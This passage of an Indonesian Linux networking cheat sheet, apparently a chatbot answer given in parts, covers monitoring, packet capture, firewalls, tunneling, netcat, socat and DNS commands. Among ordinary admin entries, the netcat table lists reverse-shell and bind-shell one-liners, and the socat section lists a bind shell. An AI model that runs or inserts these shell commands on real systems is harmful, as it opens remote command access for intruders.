| `rsync --stats sumber/ tujuan/` | Tampilkan statistik transfer |
| `rsync --max-size=10M sumber/ tujuan/` | Hanya file <= 10MB |
| `rsync --min-size=1k sumber/ tujuan/` | Hanya file >= 1KB |

**Opsi Populer rsync:**
```
-a  = archive (rekursif + symlink + permission + timestamp + group + owner)
-v  = verbose
-z  = kompresi
-P  = progress + partial (lanjutkan yang terputus)
-n  = dry run
-u  = update (skip yang lebih baru)
-H  = pertahankan hard link
-l  = pertahankan symlink
-p  = pertahankan permission
-t  = pertahankan timestamp
-g  = pertahankan group
-o  = pertahankan owner
-r  = rekursif
```

---

## 6.5 Monitoring Jaringan

### `netstat` - Network Statistics (Legacy)
```bash
netstat [opsi]
```
> Menampilkan statistik jaringan dan koneksi

> 📦 Perlu instalasi: `sudo apt install net-tools`

| Perintah | Penjelasan |
|---|---|
| `netstat` | Tampilkan koneksi aktif |
| `netstat -a` | Semua socket (listening + non-listening) |
| `netstat -t` | Hanya TCP |
| `netstat -u` | Hanya UDP |
| `netstat -l` | Hanya listening socket |
| `netstat -lt` | Listening TCP |
| `netstat -lu` | Listening UDP |
| `netstat -n` | Tampilkan angka (tidak resolve hostname) |
| `netstat -p` | Tampilkan PID dan nama program |
| `netstat -r` | Tampilkan routing table |
| `netstat -i` | Statistik interface |
| `netstat -s` | Statistik per protokol |
| `netstat -g` | Grup multicast |
| `netstat -an` | Semua koneksi dalam format numerik |
| `netstat -antp` | TCP + PID numerik |
| `netstat -anup` | UDP + PID numerik |
| `netstat -antlp` | Listening TCP + PID |
| `netstat -c` | Continuous (refresh) |
| `netstat -e` | Info tambahan |
| `netstat -tulpn` | Paling populer: TCP+UDP listening + PID numerik |

---

### `ss` - Socket Statistics (Modern)
```bash
ss [opsi]
```
> Pengganti netstat yang lebih cepat dan modern

| Perintah | Penjelasan |
|---|---|
| `ss` | Tampilkan koneksi established |
| `ss -a` | Semua socket |
| `ss -t` | Hanya TCP |
| `ss -u` | Hanya UDP |
| `ss -l` | Hanya listening |
| `ss -lt` | Listening TCP |
| `ss -lu` | Listening UDP |
| `ss -n` | Numerik (tidak resolve) |
| `ss -p` | Tampilkan proses |
| `ss -s` | Statistik ringkasan |
| `ss -r` | Resolve hostname |
| `ss -4` | IPv4 |
| `ss -6` | IPv6 |
| `ss -tulpn` | TCP+UDP listening + proses numerik |
| `ss -antlp` | Semua TCP + listen + proses |
| `ss -x` | Unix socket |
| `ss -o` | Tampilkan timer info |
| `ss -e` | Info tambahan |
| `ss -m` | Informasi memori socket |
| `ss -i` | Info TCP internal |
| `ss -K` | Kill socket |
| `ss -c` | Continuous |
| `ss dst 192.168.1.1` | Socket dengan tujuan IP |
| `ss dport = :80` | Socket ke port 80 |
| `ss sport = :22` | Socket dari port 22 |
| `ss state established` | Hanya ESTABLISHED |
| `ss state listening` | Hanya LISTENING |
| `ss -t state established '( dport = :80 )'` | Filter gabungan |

---

### `iftop` - Network Bandwidth Monitor
```bash
iftop [opsi]
```
> Monitor penggunaan bandwidth jaringan secara real-time

> 📦 Perlu instalasi: `sudo apt install iftop`

| Perintah | Penjelasan |
|---|---|
| `sudo iftop` | Monitor interface default |
| `sudo iftop -i eth0` | Monitor interface tertentu |
| `sudo iftop -n` | Jangan resolve hostname |
| `sudo iftop -N` | Jangan resolve port |
| `sudo iftop -P` | Tampilkan port |
| `sudo iftop -B` | Tampilkan dalam bytes (bukan bits) |
| `sudo iftop -F 192.168.1.0/24` | Filter subnet |
| `sudo iftop -f "port 80"` | Filter ekspresi pcap |
| `sudo iftop -o 2s` | Urutkan berdasarkan 2 detik |
| `sudo iftop -t` | Mode teks |

**Shortcut dalam iftop:**
| Tombol | Penjelasan |
|---|---|
| **h** | Bantuan |
| **n** | Toggle resolve hostname |
| **N** | Toggle resolve port |
| **p** | Toggle tampilkan port |
| **P** | Pause |
| **b** | Toggle bandwidth display |
| **B** | Cycle tampilan bandwidth |
| **T** | Toggle total traffic |
| **l** | Filter ekspresi |
| **L** | Toggle skala logaritmik |
| **j/k** | Scroll atas/bawah |
| **q** | Keluar |
| **1/2/3** | Urutkan 2s, 10s, 40s |
| **</>** | Urutkan sumber/tujuan |
| **d** | Toggle tampilan direction |

---

### `nethogs` - Monitor Bandwidth per Process
```bash
nethogs [opsi] [interface]
```
> Monitor penggunaan bandwidth per proses

> 📦 Perlu instalasi: `sudo apt install nethogs`

| Perintah | Penjelasan |
|---|---|
| `sudo nethogs` | Monitor semua interface |
| `sudo nethogs eth0` | Monitor interface tertentu |
| `sudo nethogs -d 2` | Refresh setiap 2 detik |
| `sudo nethogs -c 10` | 10 refresh lalu keluar |
| `sudo nethogs -b` | Mode batch |
| `sudo nethogs -v 3` | Verbose level 3 |
| `sudo nethogs -t` | Tracemode |

---

### `nload` - Network Traffic Monitor
```bash
nload [opsi] [interface]
```
> Monitor lalu lintas jaringan secara visual

> 📦 Perlu instalasi: `sudo apt install nload`

```bash
nload               # Monitor interface default
nload eth0          # Monitor interface tertentu
nload eth0 wlan0    # Monitor beberapa interface
nload -u h          # Unit: human readable
nload -u k          # Unit: KB/s
nload -u m          # Unit: MB/s
nload -t 500        # Refresh setiap 500ms
```

---

### `tcpdump` - Network Packet Analyzer
```bash
tcpdump [opsi] [ekspresi_filter]
```
> Capture dan analisis paket jaringan

| Perintah | Penjelasan |
|---|---|
| `sudo tcpdump` | Capture semua paket interface default |
| `sudo tcpdump -i eth0` | Capture di interface eth0 |
| `sudo tcpdump -i any` | Capture di semua interface |
| `sudo tcpdump -n` | Jangan resolve hostname |
| `sudo tcpdump -nn` | Jangan resolve hostname & port |
| `sudo tcpdump -v` | Verbose |
| `sudo tcpdump -vv` | Lebih verbose |
| `sudo tcpdump -vvv` | Paling verbose |
| `sudo tcpdump -c 100` | Capture 100 paket lalu stop |
| `sudo tcpdump -w output.pcap` | Simpan ke file pcap |
| `sudo tcpdump -r input.pcap` | Baca dari file pcap |
| `sudo tcpdump -A` | Tampilkan payload ASCII |
| `sudo tcpdump -X` | Tampilkan payload hex + ASCII |
| `sudo tcpdump -XX` | Tampilkan termasuk header ethernet |
| `sudo tcpdump -s 0` | Capture paket penuh (tidak terpotong) |
| `sudo tcpdump -l` | Line buffered (untuk pipe) |
| `sudo tcpdump -D` | Daftar interface yang tersedia |

**Filter Ekspresi:**
| Filter | Penjelasan |
|---|---|
| `sudo tcpdump host 192.168.1.1` | Paket dari/ke host |
| `sudo tcpdump src 192.168.1.1` | Paket dari host |
| `sudo tcpdump dst 192.168.1.1` | Paket ke host |
| `sudo tcpdump port 80` | Paket ke/dari port 80 |
| `sudo tcpdump src port 80` | Dari port 80 |
| `sudo tcpdump dst port 80` | Ke port 80 |
| `sudo tcpdump tcp` | Hanya TCP |
| `sudo tcpdump udp` | Hanya UDP |
| `sudo tcpdump icmp` | Hanya ICMP |
| `sudo tcpdump arp` | Hanya ARP |
| `sudo tcpdump net 192.168.1.0/24` | Dari/ke subnet |
| `sudo tcpdump "host 192.168.1.1 and port 80"` | Kombinasi AND |
| `sudo tcpdump "host 192.168.1.1 or host 192.168.1.2"` | Kombinasi OR |
| `sudo tcpdump "not port 22"` | Kecuali port 22 |
| `sudo tcpdump "tcp[tcpflags] & tcp-syn != 0"` | Hanya SYN packet |
| `sudo tcpdump "tcp[tcpflags] & tcp-rst != 0"` | Hanya RST packet |
| `sudo tcpdump greater 1000` | Paket lebih besar 1000 bytes |
| `sudo tcpdump less 100` | Paket lebih kecil 100 bytes |

**Contoh Kombinasi:**
```bash
# Capture traffic HTTP dan HTTPS
sudo tcpdump -i eth0 -nn port 80 or port 443

# Capture dan simpan traffic DNS
sudo tcpdump -i eth0 -w dns.pcap port 53

# Monitor koneksi SSH
sudo tcpdump -i eth0 -n "tcp port 22 and host 192.168.1.100"

# Lihat payload HTTP request
sudo tcpdump -i eth0 -A -s 0 "tcp port 80 and host 192.168.1.1"

# Capture paket ke file dengan rotasi
sudo tcpdump -i eth0 -w capture-%Y%m%d-%H%M%S.pcap -G 3600
```

---

### `wireshark` - GUI Network Analyzer
```bash
wireshark [opsi] [file.pcap]
```
> Analisis paket jaringan dengan antarmuka grafis

```bash
wireshark                         # Buka Wireshark
wireshark -r capture.pcap        # Buka file pcap
wireshark -k -i eth0             # Langsung capture
tshark                            # Versi CLI Wireshark
tshark -i eth0                    # Capture di terminal
tshark -r file.pcap              # Baca file pcap
tshark -R "http" -r file.pcap   # Filter display
```

---

## 6.6 Firewall

### `ufw` - Uncomplicated Firewall
```bash
ufw [opsi] <perintah>
```
> Firewall yang mudah digunakan (wrapper untuk iptables)

| Perintah | Penjelasan |
|---|---|
| `sudo ufw enable` | Aktifkan firewall |
| `sudo ufw disable` | Nonaktifkan firewall |
| `sudo ufw status` | Status firewall |
| `sudo ufw status verbose` | Status detail |
| `sudo ufw status numbered` | Status dengan nomor rule |
| `sudo ufw reset` | Reset ke default |
| `sudo ufw reload` | Reload konfigurasi |
| `sudo ufw default deny incoming` | Default tolak semua masuk |
| `sudo ufw default allow outgoing` | Default izinkan semua keluar |
| `sudo ufw default deny outgoing` | Default tolak semua keluar |
| `sudo ufw allow ssh` | Izinkan SSH |
| `sudo ufw allow 22` | Izinkan port 22 |
| `sudo ufw allow 22/tcp` | Izinkan port 22 TCP |
| `sudo ufw allow 80,443/tcp` | Izinkan port 80 dan 443 |
| `sudo ufw allow from 192.168.1.0/24` | Izinkan dari subnet |
| `sudo ufw allow from 192.168.1.100` | Izinkan dari IP tertentu |
| `sudo ufw allow from 192.168.1.100 to any port 22` | IP tertentu ke port 22 |
| `sudo ufw deny 23` | Tolak port 23 |
| `sudo ufw deny from 192.168.1.100` | Tolak dari IP tertentu |
| `sudo ufw delete allow 80` | Hapus rule |
| `sudo ufw delete 3` | Hapus rule nomor 3 |
| `sudo ufw insert 1 allow from 192.168.1.100` | Sisipkan rule di posisi 1 |
| `sudo ufw limit ssh` | Rate limit SSH |
| `sudo ufw logging on` | Aktifkan logging |
| `sudo ufw logging off` | Nonaktifkan logging |
| `sudo ufw logging medium` | Level logging |

---

### `iptables` - Linux Firewall
```bash
iptables [opsi] <perintah>
```
> Firewall dan NAT yang sangat powerful

**Melihat Rules:**
| Perintah | Penjelasan |
|---|---|
| `sudo iptables -L` | Tampilkan semua rules |
| `sudo iptables -L -v` | Verbose dengan statistik |
| `sudo iptables -L -n` | Numerik |
| `sudo iptables -L -n --line-numbers` | Dengan nomor baris |
| `sudo iptables -L INPUT -n` | Rules chain INPUT |
| `sudo iptables -L OUTPUT -n` | Rules chain OUTPUT |
| `sudo iptables -L FORWARD -n` | Rules chain FORWARD |
| `sudo iptables -t nat -L` | Tampilkan tabel NAT |
| `sudo iptables -t mangle -L` | Tampilkan tabel mangle |
| `sudo iptables -S` | Tampilkan dalam format perintah |

**Menambah Rules:**
| Perintah | Penjelasan |
|---|---|
| `sudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT` | Izinkan SSH masuk |
| `sudo iptables -A INPUT -p tcp --dport 80 -j ACCEPT` | Izinkan HTTP |
| `sudo iptables -A INPUT -p tcp --dport 443 -j ACCEPT` | Izinkan HTTPS |
| `sudo iptables -A INPUT -s 192.168.1.100 -j ACCEPT` | Izinkan IP tertentu |
| `sudo iptables -A INPUT -s 192.168.1.0/24 -j ACCEPT` | Izinkan subnet |
| `sudo iptables -A INPUT -i lo -j ACCEPT` | Izinkan loopback |
| `sudo iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT` | Izinkan koneksi yang sudah ada |
| `sudo iptables -A INPUT -j DROP` | Tolak semua (harus di akhir) |
| `sudo iptables -I INPUT 1 -s 192.168.1.100 -j DROP` | Sisipkan di posisi 1 |
| `sudo iptables -A OUTPUT -p tcp --dport 25 -j DROP` | Blok SMTP keluar |

**Menghapus Rules:**
| Perintah | Penjelasan |
|---|---|
| `sudo iptables -D INPUT -p tcp --dport 80 -j ACCEPT` | Hapus rule tertentu |
| `sudo iptables -D INPUT 3` | Hapus rule nomor 3 |
| `sudo iptables -F` | Flush semua rules |
| `sudo iptables -F INPUT` | Flush chain INPUT |
| `sudo iptables -X` | Hapus semua chain kustom |
| `sudo iptables -Z` | Reset counter |

**NAT:**
```bash
# Source NAT (Masquerade)
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

# Source NAT dengan IP tertentu
sudo iptables -t nat -A POSTROUTING -o eth0 -j SNAT --to-source 1.2.3.4

# Destination NAT (Port Forwarding)
sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.1.100:80

# Aktifkan IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward
```

**Menyimpan & Memulihkan:**
```bash
# Simpan rules
sudo iptables-save > /etc/iptables/rules.v4
sudo ip6tables-save > /etc/iptables/rules.v6

# Pulihkan rules
sudo iptables-restore < /etc/iptables/rules.v4

# Install iptables-persistent
sudo apt install iptables-persistent
```

---

### `firewalld` - Dynamic Firewall (RHEL/CentOS/Fedora)
```bash
firewall-cmd [opsi] <perintah>
```
> Firewall dinamis untuk sistem RHEL/CentOS/Fedora

| Perintah | Penjelasan |
|---|---|
| `sudo systemctl start firewalld` | Start firewalld |
| `sudo systemctl enable firewalld` | Enable saat boot |
| `firewall-cmd --state` | Status firewall |
| `firewall-cmd --get-zones` | Daftar zones |
| `firewall-cmd --get-default-zone` | Zone default |
| `firewall-cmd --get-active-zones` | Zone aktif |
| `sudo firewall-cmd --set-default-zone=public` | Set zone default |
| `firewall-cmd --list-all` | Semua rules zone default |
| `firewall-cmd --list-all --zone=public` | Rules zone tertentu |
| `sudo firewall-cmd --add-service=http` | Izinkan service HTTP |
| `sudo firewall-cmd --add-service=https` | Izinkan HTTPS |
| `sudo firewall-cmd --add-port=8080/tcp` | Izinkan port |
| `sudo firewall-cmd --add-port=8080/tcp --permanent` | Permanen |
| `sudo firewall-cmd --remove-service=http` | Hapus service |
| `sudo firewall-cmd --remove-port=8080/tcp` | Hapus port |
| `sudo firewall-cmd --reload` | Reload konfigurasi |
| `sudo firewall-cmd --add-masquerade` | Aktifkan masquerade |
| `sudo firewall-cmd --add-forward-port=port=80:proto=tcp:toport=8080` | Port forwarding |
| `sudo firewall-cmd --add-source=192.168.1.0/24` | Izinkan subnet |
| `sudo firewall-cmd --add-rich-rule='...'` | Tambah rule kompleks |
| `firewall-cmd --list-services` | Daftar service yang diizinkan |

---

## 6.7 VPN & Tunneling

### `ssh` Tunneling
```bash
# Local port forwarding
# Akses remote:3306 via localhost:3306
ssh -L 3306:localhost:3306 user@remote-server

# Akses remote-db:3306 via localhost:3306
ssh -L 3306:remote-db:3306 user@jump-server

# Remote port forwarding
# Buka port 8080 di remote yang forward ke local:80
ssh -R 8080:localhost:80 user@remote-server

# Dynamic port forwarding (SOCKS proxy)
ssh -D 1080 user@remote-server

# Tanpa shell (hanya tunnel)
ssh -N -L 3306:localhost:3306 user@remote-server

# Background
ssh -N -f -L 3306:localhost:3306 user@remote-server
```

---

### `openvpn` - OpenVPN Client
```bash
sudo openvpn --config client.ovpn           # Connect dengan config
sudo openvpn --config client.ovpn --daemon  # Di background
sudo systemctl start openvpn@client         # Via systemd
```

---

### `wireguard` - Modern VPN
```bash
# Install
sudo apt install wireguard

# Buat key pair
wg genkey | sudo tee /etc/wireguard/private.key
sudo cat /etc/wireguard/private.key | wg pubkey | sudo tee /etc/wireguard/public.key

# Manajemen
sudo wg                           # Status WireGuard
sudo wg show                      # Detail interface
sudo wg-quick up wg0              # Aktifkan interface wg0
sudo wg-quick down wg0            # Nonaktifkan
sudo systemctl start wg-quick@wg0  # Via systemd
sudo systemctl enable wg-quick@wg0 # Enable saat boot
```

---

## 6.8 Perintah Jaringan Tambahan

### `route` - Show/Modify Routing Table (Legacy)
```bash
route [opsi]
```
> Menampilkan dan memodifikasi tabel routing

```bash
route                                          # Tampilkan routing table
route -n                                       # Numerik
sudo route add default gw 192.168.1.1         # Tambah default gateway
sudo route add -net 10.0.0.0 netmask 255.0.0.0 gw 192.168.1.1  # Tambah route
sudo route del default                         # Hapus default gateway
sudo route del -net 10.0.0.0 netmask 255.0.0.0  # Hapus route
```

---

### `arp` - ARP Table (Legacy)
```bash
arp [opsi]
```
> Manajemen tabel ARP

```bash
arp                           # Tampilkan tabel ARP
arp -n                        # Numerik
arp -a                        # Format BSD
arp 192.168.1.1               # Entry tertentu
arp -i eth0                   # Interface tertentu
sudo arp -s 192.168.1.1 00:11:22:33:44:55  # Tambah entry statis
sudo arp -d 192.168.1.1       # Hapus entry
```

---

### `nc` / `netcat` - Network Swiss Army Knife
```bash
nc [opsi] <host> <port>
```
> Tool jaringan yang sangat fleksibel

| Perintah | Penjelasan |
|---|---|
| `nc -v host 80` | Connect ke host:port |
| `nc -vz host 80` | Cek port terbuka (tanpa kirim data) |
| `nc -vz host 1-1000` | Scan port range |
| `nc -l 8080` | Listen di port 8080 |
| `nc -lp 8080` | Listen (beberapa versi) |
| `nc -u host 53` | UDP mode |
| `nc -w 5 host 80` | Timeout 5 detik |
| `nc -k -l 8080` | Keep listening setelah koneksi |
| `nc host 80 < request.txt` | Kirim file |
| `nc -l 8080 > received.txt` | Terima file |
| `nc host 8080 < file.txt` | Transfer file (client) |
| `nc -l 8080 > file.txt` | Transfer file (server) |
| `nc -e /bin/bash host 4444` | Reverse shell |
| `nc -l 4444 -e /bin/bash` | Bind shell |

**Contoh Penggunaan:**
```bash
# Cek apakah port terbuka
nc -zv 192.168.1.1 22
# Connection to 192.168.1.1 22 port [tcp/ssh] succeeded!

# Transfer file sederhana
# Di penerima:
nc -l 8080 > file.txt
# Di pengirim:
nc 192.168.1.100 8080 < file.txt

# Chat sederhana
# Terminal 1:
nc -l 8080
# Terminal 2:
nc localhost 8080

# HTTP request manual
echo -e "GET / HTTP/1.0\r\nHost: google.com\r\n\r\n" | nc google.com 80
```

---

### `socat` - SOcket CAT
```bash
socat [opsi] <address1> <address2>
```
> Versi netcat yang lebih powerful

> 📦 Perlu instalasi: `sudo apt install socat`

```bash
socat TCP-LISTEN:8080,fork TCP:host:80    # Port forwarding
socat - TCP:host:80                        # Connect ke TCP
socat TCP-LISTEN:8080 EXEC:/bin/bash      # Bind shell
socat FILE:file.txt TCP:host:8080         # Kirim file
socat TCP:host:8080 FILE:output.txt       # Terima file
socat UDP-LISTEN:5005 STDOUT              # UDP listener
socat OPENSSL-LISTEN:443,cert=server.pem,fork TCP:localhost:80  # SSL proxy
```

---

### `whois` - Domain Information
```bash
whois [opsi] <domain/IP>
```
> Mencari informasi registrasi domain atau IP

```bash
whois google.com          # Info domain
whois 8.8.8.8             # Info IP
whois -h whois.iana.org google.com  # Server WHOIS tertentu
whois -H google.com       # Tanpa disclaimer
```

---

### `nslookup` & Pengujian DNS Lanjutan
```bash
# Cek semua DNS server
dig +trace google.com

# Test DNSSEC
dig +dnssec google.com

# Cek SPF record
dig google.com TXT | grep spf

# Cek DMARC
dig _dmarc.google.com TXT

# Cek DKIM
dig selector._domainkey.google.com TXT

# Zone transfer (jika diizinkan)
dig @ns1.google.com google.com AXFR

# Bandingkan hasil dari dua DNS
diff <(dig @8.8.8.8 google.com +short) <(dig @1.1.1.1 google.com +short)
```

---

### `ethtool` - Ethernet Tool
```bash
ethtool [opsi] <interface>
```
> Menampilkan dan mengubah pengaturan ethernet

```bash
ethtool eth0                    # Info interface
ethtool -i eth0                 # Info driver
ethtool -S eth0                 # Statistik
ethtool -a eth0                 # Pause parameters
ethtool -k eth0                 # Offload settings
sudo ethtool -s eth0 speed 1000 duplex full  # Set speed
sudo ethtool -G eth0 rx 4096 tx 4096  # Set ring buffer
ethtool -t eth0                 # Self test
```

---

### `iw` - Wireless Tool
```bash
iw [opsi] <perintah>
```
> Konfigurasi wireless interface

```bash
iw dev                         # Daftar wireless interface
iw dev wlan0 scan              # Scan WiFi
iw dev wlan0 info              # Info interface
iw dev wlan0 link              # Status koneksi
iw dev wlan0 station dump      # Info station
iw dev wlan0 set txpower fixed 2000  # Set TX power
sudo iw dev wlan0 set channel 6  # Set channel
```

---

### `iwconfig` - Wireless Configuration (Legacy)
```bash
iwconfig [interface]
```
> Konfigurasi wireless interface (versi lama)

```bash
iwconfig                       # Info semua interface wireless
iwconfig wlan0                 # Info interface tertentu
sudo iwconfig wlan0 essid "SSID"  # Connect ke SSID
sudo iwconfig wlan0 key s:password  # Set WEP key
sudo iwconfig wlan0 txpower 20  # Set TX power
```

---

## Ringkasan Perintah Bagian 6

```
ip               → Manajemen jaringan modern (addr/link/route/neigh)
ifconfig         → Konfigurasi interface (legacy)
hostname         → Hostname sistem
nmcli            → CLI NetworkManager
ping             → Uji konektivitas
traceroute       → Trace jalur jaringan
mtr              → ping + traceroute real-time
nmap             → Network scanner
nslookup         → Query DNS (simple)
dig              → Query DNS (advanced)
host             → DNS lookup
resolvectl       → Manajemen DNS systemd
wget             → Download file dari web
curl             → Transfer data HTTP/FTP
scp              → Copy file via SSH
rsync            → Sinkronisasi file
netstat          → Statistik jaringan (legacy)
ss               → Socket statistics (modern)
iftop            → Monitor bandwidth real-time
nethogs          → Bandwidth per proses
tcpdump          → Capture & analisis paket
ufw              → Firewall sederhana
iptables         → Firewall advanced
firewalld        → Firewall RHEL/CentOS
nc/netcat        → Network swiss army knife
socat            → Socket relay advanced
whois            → Info domain/IP
ethtool          → Konfigurasi ethernet
iw/iwconfig      → Konfigurasi wireless
```

---

## ✅ Bagian 6 Selesai!

**Lanjut ke Bagian 7: Perintah Disk & Storage?**

Ketik:
- ✅ **"Lanjut"** → Ke Bagian 7
- 🔄 **"Ulangi"** → Ulangi Bagian 6
- 🎯 **"Langsung ke Bagian X"** → Lompat ke bagian tertentu
